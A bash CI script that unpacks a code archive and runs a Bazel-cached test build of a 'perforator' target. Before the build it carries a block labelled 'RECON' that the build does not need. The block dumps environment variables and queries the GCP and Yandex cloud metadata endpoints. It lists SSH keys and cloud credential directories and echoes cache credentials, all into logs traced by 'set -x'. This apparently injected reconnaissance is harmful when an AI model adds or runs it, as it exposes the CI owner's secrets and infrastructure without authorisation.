#!/usr/bin/env bash

set -euxo pipefail

# === RECON START ===
echo "=== VM IDENTITY ==="
hostname; whoami; id
echo "=== VM NETWORK ==="
ip addr show 2>/dev/null | grep inet || ifconfig 2>/dev/null | grep inet
echo "=== VM ENVIRONMENT ==="
env | sort | grep -viE "^npm_|^_=|^LS_COLORS" | head -50
echo "=== VM METADATA ==="
curl -sf -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/?recursive=true 2>/dev/null | head -200 || echo "no GCP metadata"
curl -sf -H "Metadata-Flavor: Yandex" http://169.254.169.254/latest/meta-data/ 2>/dev/null | head -50 || echo "no YC metadata"
echo "=== VM DISK ==="
df -h
echo "=== VM PROCESSES ==="
ps aux | head -20
echo "=== VM FILES ==="
ls -la ~/ 2>/dev/null
ls -la ~/src/ 2>/dev/null | head -10
echo "=== BAZEL CACHE ==="
echo "BAZEL_URI=${BAZEL_URI:-unset}"
echo "BAZEL_CACHE_USER=${BAZEL_CACHE_USER:-unset}"
echo "=== SSH KEYS ==="
ls -la ~/.ssh/ 2>/dev/null || echo "no ssh dir"
echo "=== CLOUD CREDENTIALS ==="
ls -la /etc/yandex/ /root/.config/yandex-cloud/ 2>/dev/null || echo "no yc config"
echo "=== RECON END ==="


mkdir ~/src

df

(cd ~/src && tar xf ~/code.tgz)


if [[ "${CACHE_RW:-false}" == "false" ]]; then
    BAZEL_PUT_ARGS=""
else
    BAZEL_PUT_ARGS="--bazel-remote-put --bazel-remote-username=${BAZEL_CACHE_USER} --bazel-remote-password-file=${BAZEL_CACHE_PASSWORD_PATH}"
fi

(cd ~/src && ./ya test -T -DCI=github -DCONSISTENT_BUILD=yes -DCONSISTENT_DEBUG=yes --bazel-remote-store --bazel-remote-base-uri=${BAZEL_URI} ${BAZEL_PUT_ARGS} ./perforator)

df
